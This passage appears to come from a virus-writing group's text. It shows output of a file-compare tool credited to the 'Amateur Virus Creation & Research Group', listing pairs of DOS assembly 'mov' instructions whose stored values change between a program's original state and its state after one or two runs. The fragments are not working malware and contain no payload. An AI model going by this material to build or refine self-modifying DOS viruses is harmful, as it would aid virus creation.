           mov     Word Ptr DS:data_e,DX   ; [603D:000E] = 0B20h
           mov     Word Ptr DS:data_e,DX   ; [603D:000E] = 0
   ;----------------------------------------------------------------------------
           mov     Word Ptr DS:data_1d,DX  ; [603D:001D] = 200Bh
           mov     Word Ptr DS:data_1d,DX  ; [603D:001D] = 501h
   ;----------------------------------------------------------------------------
   ; END OF FIRST FILE, EXTRA CODE IS FROM SECOND FILE


           Run Twice Compared to Original (Above):

   ; FILE CREATED BY FILE COMPARE v.1.2
   ; DEVELOPED BY:
   ; MICRO PROFESSOR SOFTWARE,
   ; ALONG WITH AMATEUR VIRUS CREATION & RESEARCH GROUP.
   ; ASCII CODE!

   ;----------------------------------------------------------------------------
           mov     Word Ptr DS:data_e,DX   ; [603D:000E] = 0B20h
           mov     Word Ptr DS:data_e,DX   ; [603D:000E] = 0
   ;----------------------------------------------------------------------------
           mov     Word Ptr DS:data_e9,AX  ; [603D:00E9] = 200Bh
           mov     Word Ptr DS:data_e9,AX  ; [603D:00E9] = 0
   ;----------------------------------------------------------------------------
           mov     Word Ptr DS:data_1d,DX  ; [603D:001D] = 200Bh
           mov     Word Ptr DS:data_1d,DX  ; [603D:001D] = 0
   ;----------------------------------------------------------------------------
           mov     Word Ptr DS:data_44,DX  ; [603D:0044] = 0B20h
           mov     Word Ptr DS:data_44,DX  ; [603D:0044] = 0
   ;----------------------------------------------------------------------------
           mov     Word Ptr DS:data_34,AX  ; [603D:0034] = 0B20h
           mov     Word Ptr DS:data_34,AX  ; [603D:0034] = 0
   ;----------------------------------------------------------------------------
           mov     Word Ptr DS:data_36,AX  ; [603D:0036] = 0B20h
           mov     Word Ptr DS:data_36,AX  ; [603D:0036] = 0
   ;----------------------------------------------------------------------------
   ; END OF FIRST FILE, EXTRA CODE IS FROM SECOND FILE

               Run Twice, and Compared to Run Once
   ; FILE CREATED BY FILE COMPARE v.1.2
   ; DEVELOPED BY:
   ; MICRO PROFESSOR SOFTWARE,
   ; ALONG WITH AMATEUR VIRUS CREATION & RESEARCH GROUP.
   ; ASCII CODE!

   ;----------------------------------------------------------------------------
           mov     Word Ptr DS:data_e9,AX  ; [603D:00E9] = 200Bh
           mov     Word Ptr DS:data_e9,AX  ; [603D:00E9] = 0
   ;----------------------------------------------------------------------------
           mov     Word Ptr DS:data_1d,DX  ; [603D:001D] = 501h
           mov     Word Ptr DS:data_1d,DX  ; [603D:001D] = 0
   ;----------------------------------------------------------------------------
           mov     Word Ptr DS:data_44,DX  ; [603D:0044] = 0B20h
           mov     Word Ptr DS:data_44,DX  ; [603D:0044] = 0
   ;----------------------------------------------------------------------------
           mov     Word Ptr DS:data_34,AX  ; [603D:0034] = 0B20h
           mov     Word Ptr DS:data_34,AX  ; [603D:0034] = 0
   ;----------------------------------------------------------------------------
           mov     Word Ptr DS:data_36,AX  ; [603D:0036] = 0B20h
           mov     Word Ptr DS:data_36,AX  ; [603D:0036] = 0
   ;----------------------------------------------------------------------------
   ; END OF FIRST FILE, EXTRA CODE IS FROM SECOND FILE
